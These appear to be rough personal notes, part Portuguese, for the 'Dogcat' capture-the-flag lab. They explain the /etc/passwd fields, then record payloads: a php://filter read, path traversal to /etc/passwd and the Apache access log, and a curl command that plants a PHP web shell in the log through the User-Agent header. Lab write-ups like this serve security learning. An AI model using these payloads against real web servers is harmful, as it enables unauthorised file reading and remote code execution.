#Dogcat Room

#Users

´´´
	.1 - Nome de usuários (de 1 até 32 caracteres)
	.2 - Senha (o "x" indica que é uma senha armazenada no /etc/shadow)
	.3 - UID (Identificação do usuário, pode variar de 0 até 65535)
	.4 - GID (Identificação do grupo, 1000 é grupo primário)
	.5 - Comentários (informações extras, nome completo, telefone...), esse campo também é conhecido como campo GECOS 
	.6 - Diretório home (caminho do diretório padrão)
	.7 - Shell padrão do usuário (programa que roda ao fazer login).
´´´


#Exploiting 

```
Export $IP=10.10.248.177
Well,i need to understand how php works and how can i bypass it to access the system or get some file include.

view=php://filter/convert.base64-encode/resource=/etc/passwd

but it doesnt work because we need to put dog or cat in this url,so if we made this

view=dog/../../../../../../../../etc/passwd&ext=

we get the passwd text yea but its give anything for us so 

view=dog/../../../../../../../var/log/apache2/access.log&ext=

curl "http://$ip/" -H  "User-Agent: <?php system(\$_GET['c']"); ?>
```